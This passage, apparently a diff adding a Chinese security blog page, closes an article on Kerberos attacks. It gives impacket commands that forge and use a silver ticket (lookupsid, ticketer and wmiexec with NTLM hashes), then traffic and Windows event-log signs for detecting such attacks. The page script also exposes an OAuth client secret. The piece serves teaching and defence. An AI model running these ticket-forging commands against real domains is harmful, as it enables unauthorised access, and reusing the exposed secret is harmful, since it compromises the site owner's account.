+<p><code>python lookupsid.py windows.local/windows@172.16.178.9 -hashes 0:9e7620e4e1a34c1fdcf3228896dc9d22</code></p>
+<p>三、形成票据</p>
+<p><code>python ticketer.py -nthash 4d6bb8456fde083dcdc9a23c6c7c1425 -domain-sid S-1-5-21-4142917197-1339067896-309211218 -domain windows.local -spn http/web.windows.local(service name/host) web(username)</code></p>
+<p>四、使用银票</p>
+<p><code>export KRB5CCNAME=/Users/impacket-master/examples/test.ccache;python wmiexec.py windows.local/test@test.windows.local -k -no-pass -debug</code></p>
+<p>流量：此攻击方法的流量相比于正常的流量少了tgs和tgt获取过程。</p>
+<h2 id="对抗"><a href="#对抗" class="headerlink" title="对抗"></a>对抗</h2><h3 id="流量层"><a href="#流量层" class="headerlink" title="流量层"></a>流量层</h3><p>此处的对抗主要是通过impacket进行的，如果是其他的工具，可以也可以用此思路来检测。</p>
+<p>通过抓取impacket的数据包，可以看见</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104162725971.png" alt="image-20211104162725971"></p>
+<p>下面是我默认域环境下的认证包</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104162810225.png" alt="image-20211104162810225"></p>
+<p>域默认环境的till时间是2037年的09月13日，而impacket的till时间是大概半天后，如果在流量层加此规则，就能筛选出impacket中进行tgt和tgs获取的流量包。从而检测出绝大多数kerberos相关的攻击。</p>
+<h3 id="主机层"><a href="#主机层" class="headerlink" title="主机层"></a>主机层</h3><p>主机层的防御很多都和windows的事件记录器相关，下面是通过kerberos进行登陆的事件。正常情况下，DC的windows事件中，没有这三个连续的事件，通过筛选出这三个连续的事件来确认关键服务器是否被攻击。</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103026660.png" alt="image-20211104103026660"></p>
+<p>进一步查看4624号事件，可以看见如果kerberos的票据通过smb、wmi、psexec等方式登陆成功后，IpAddress中会显示出具体的IPV4地址。</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103129919.png" alt="image-20211104103129919"></p>
+<p>如果登陆失败，则会显示一个ipV6地址。</p>
+<p><img src="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/image-20211104103106607.png" alt="image-20211104103106607"></p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>Kerberos RFC ：<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc1510">https://datatracker.ietf.org/doc/html/rfc1510</a></p>
+<p>blog：<a target="_blank" rel="noopener" href="https://www.tarlogic.com/blog/how-kerberos-works/">https://www.tarlogic.com/blog/how-kerberos-works/</a></p>
+<p>​      <a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/">https://daiker.gitbook.io/windows-protocol/</a></p>
+<p>microsoft：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/basic-authentication-concepts">https://docs.microsoft.com/en-us/windows/win32/secauthn/basic-authentication-concepts</a></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://jd.army">JD.Army</a>
+            <p>Link：<a href="http://jd.army/2021/11/04/kerberos%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2/">http://jd.army/2021/11/04/kerberos%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2/</a>
+            <p>Publish date：<a href="http://jd.army/2021/11/04/kerberos%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2/">November 4th 2021, 3:47:43 pm</a>
+            <p>Update date：<a href="http://jd.army/2021/11/04/kerberos%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2/">November 25th 2021, 3:49:26 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2021/11/05/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC5%E6%9C%9F/" title="蓝军推送(第5期)">
+                    <div class="nextTitle">蓝军推送(第5期)</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2021/10/28/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC4%E6%9C%9F/" title="蓝军推送(第4期)">
+                    <div class="prevTitle">蓝军推送(第4期)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+    <div id="gitment-container"></div>
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script>
+        var gitment = new Gitment({
+            id: '1636012063000', // 可选。默认为 location.href
+            owner: 'JDArmy',
+            repo: 'JDArmy.github.io',
+            oauth: {
+                client_id: '8b983dd2d64ab564beb1',
+                client_secret: 'b0a9f6e529c0bcdfbb7e3db67bdb834d9133d04d',
+            },
+        })
+        gitment.render('gitment-container')
+    </script>
+
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:Master@JD.Army" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/JDArmy" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E5%8E%86%E5%8F%B2"><span class="toc-number">1.</span> <span class="toc-text">Kerberos历史</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E4%B8%AD%E7%9A%84kerberos"><span class="toc-number">2.</span> <span class="toc-text">windows中的kerberos</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberos%E8%AF%A6%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">kerberos详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos%E9%A2%84%E8%AE%A4%E8%AF%81"><span class="toc-number">3.1.</span> <span class="toc-text">kerberos预认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">认证流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AS-REQ"><span class="toc-number">3.2.1.</span> <span class="toc-text">AS-REQ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AS-REP"><span class="toc-number">3.2.2.</span> <span class="toc-text">AS-REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TGS-REQ"><span class="toc-number">3.2.3.</span> <span class="toc-text">TGS-REQ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TGS-REP"><span class="toc-number">3.2.4.</span> <span class="toc-text">TGS-REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AP-REQ"><span class="toc-number">3.2.5.</span> <span class="toc-text">AP-REQ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AP-REP"><span class="toc-number">3.2.6.</span> <span class="toc-text">AP-REP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.</span> <span class="toc-text">相关攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.3.1.</span> <span class="toc-text">用户名枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Spraying%EF%BC%88%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84%EF%BC%89"><span class="toc-number">3.3.2.</span> <span class="toc-text">Password Spraying（密码喷射）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AS-REPRoasting%EF%BC%88%E7%A6%BB%E7%BA%BF%E7%88%86%E7%A0%B4%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">3.3.3.</span> <span class="toc-text">AS-REPRoasting（离线爆破明文密码）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.3.4.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kerberosting"><span class="toc-number">3.3.5.</span> <span class="toc-text">kerberosting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.3.6.</span> <span class="toc-text">白银票据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97"><span class="toc-number">4.</span> <span class="toc-text">对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%B1%82"><span class="toc-number">4.1.</span> <span class="toc-text">流量层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%B1%82"><span class="toc-number">4.2.</span> <span class="toc-text">主机层</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">5.</span> <span class="toc-text">参考文献</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 10
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2021/11/25/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC8%E6%9C%9F/">蓝军推送(第8期)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span>
+            <a class="archive-post-title" href="/2021/11/18/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC7%E6%9C%9F/">蓝军推送(第7期)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span>
+            <a class="archive-post-title" href="/2021/11/11/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC6%E6%9C%9F/">蓝军推送(第6期)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span>
+            <a class="archive-post-title" href="/2021/11/05/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC5%E6%9C%9F/">蓝军推送(第5期)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span>
+            <a class="archive-post-title" href="/2021/11/04/kerberos%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2/">Kerberos基础知识以及攻击面</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span>
+            <a class="archive-post-title" href="/2021/10/28/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC4%E6%9C%9F/">蓝军推送(第4期)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span>
+            <a class="archive-post-title" href="/2021/10/20/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC3%E6%9C%9F/">蓝军推送(第3期)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/13</span>
+            <a class="archive-post-title" href="/2021/10/13/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC2%E6%9C%9F/">蓝军推送(第2期)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span>
+            <a class="archive-post-title" href="/2021/10/09/%E8%93%9D%E5%86%9B%E6%8E%A8%E9%80%81-%E7%AC%AC1%E6%9C%9F/">蓝军推送(第1期)</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span>
+            <a class="archive-post-title" href="/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">ProcessGhosting - 一套通用的免杀，自删除解决方案</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="kerberos">
+                <span class="iconfont-archer">&#xe606;</span>
+                kerberos
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="AD">
+                <span class="iconfont-archer">&#xe606;</span>
+                AD
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="金票">
+                <span class="iconfont-archer">&#xe606;</span>
+                金票
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="银票">
+                <span class="iconfont-archer">&#xe606;</span>
+                银票
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="kerberosting">
+                <span class="iconfont-archer">&#xe606;</span>
+                kerberosting
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ProcessGhosting">
+                <span class="iconfont-archer">&#xe606;</span>
+                ProcessGhosting
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="进程">
+                <span class="iconfont-archer">&#xe606;</span>
+                进程
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="零信任实践分享">
+                <span class="iconfont-archer">&#xe606;</span>
+                零信任实践分享
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ZTNA">
+                <span class="iconfont-archer">&#xe606;</span>
+                ZTNA
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Jira">
+                <span class="iconfont-archer">&#xe606;</span>
+                Jira
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="HandleKatz">
+                <span class="iconfont-archer">&#xe606;</span>
+                HandleKatz
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="lsass">
+                <span class="iconfont-archer">&#xe606;</span>
+                lsass
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="procdump">
+                <span class="iconfont-archer">&#xe606;</span>
+                procdump
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="mimikatz">
+                <span class="iconfont-archer">&#xe606;</span>
+                mimikatz
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="远程提取凭证">
+                <span class="iconfont-archer">&#xe606;</span>
+                远程提取凭证
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Exchange">
+                <span class="iconfont-archer">&#xe606;</span>
+                Exchange
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Adobe Reader">
+                <span class="iconfont-archer">&#xe606;</span>
+                Adobe Reader
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="NimlineWhispers">
+                <span class="iconfont-archer">&#xe606;</span>
+                NimlineWhispers
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Bypass AMSI">
+                <span class="iconfont-archer">&#xe606;</span>
+                Bypass AMSI
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="本地提权">
+                <span class="iconfont-archer">&#xe606;</span>
+                本地提权
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="LDAPmonitor">
+                <span class="iconfont-archer">&#xe606;</span>
+                LDAPmonitor
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Payload">
+                <span class="iconfont-archer">&#xe606;</span>
+                Payload
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Bypass">
+                <span class="iconfont-archer">&#xe606;</span>
+                Bypass
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="chm">
+                <span class="iconfont-archer">&#xe606;</span>
+                chm
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="TeamTNT">
+                <span class="iconfont-archer">&#xe606;</span>
+                TeamTNT
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="DBIR">
+                <span class="iconfont-archer">&#xe606;</span>
+                DBIR
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="魔形女">
+                <span class="iconfont-archer">&#xe606;</span>
+                魔形女
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="delete-self-poc">
+                <span class="iconfont-archer">&#xe606;</span>
+                delete-self-poc
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="SharpUnhooker">
+                <span class="iconfont-archer">&#xe606;</span>
+                SharpUnhooker
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Sherlock">
+                <span class="iconfont-archer">&#xe606;</span>
+                Sherlock
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="情报收集">
+                <span class="iconfont-archer">&#xe606;</span>
+                情报收集
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CVE">
+                <span class="iconfont-archer">&#xe606;</span>
+                CVE
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Excel">
+                <span class="iconfont-archer">&#xe606;</span>
+                Excel
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="rpcfirewall">
+                <span class="iconfont-archer">&#xe606;</span>
+                rpcfirewall
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="dll 镂空">
+                <span class="iconfont-archer">&#xe606;</span>
+                dll 镂空
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CVE-2021-37580">
+                <span class="iconfont-archer">&#xe606;</span>
+                CVE-2021-37580
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="lsarelayx">
+                <span class="iconfont-archer">&#xe606;</span>
+                lsarelayx
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CobaltStrikeParser">
+                <span class="iconfont-archer">&#xe606;</span>
+                CobaltStrikeParser
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="DACL">
+                <span class="iconfont-archer">&#xe606;</span>
+                DACL
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="CobaltStrike">
+                <span class="iconfont-archer">&#xe606;</span>
+                CobaltStrike
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="蜜罐">
+                <span class="iconfont-archer">&#xe606;</span>
+                蜜罐
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="渗透基础">
+            <span class="iconfont-archer">&#xe60a;</span>
+            渗透基础
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="渗透技术">
+            <span class="iconfont-archer">&#xe60a;</span>
+            渗透技术
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="蓝军推送">
+            <span class="iconfont-archer">&#xe60a;</span>
+            蓝军推送
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        url: "http://jd.army",
+        root: "/",
+        author: "JD.Army"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20210823"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20210823"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
